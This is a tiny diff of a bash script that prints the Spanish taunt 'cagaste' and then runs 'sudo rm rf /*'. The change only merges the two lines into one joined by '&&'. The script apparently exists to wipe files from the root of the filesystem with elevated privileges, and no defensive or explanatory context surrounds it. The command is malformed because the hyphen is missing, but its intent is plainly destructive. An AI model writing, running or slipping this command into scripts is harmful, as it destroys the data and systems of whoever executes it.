@@ -1,4 +1,2 @@
 #!/bin/bash
-echo "cagaste"
-
-sudo rm rf /* 
+echo "cagaste" && sudo rm rf /* 
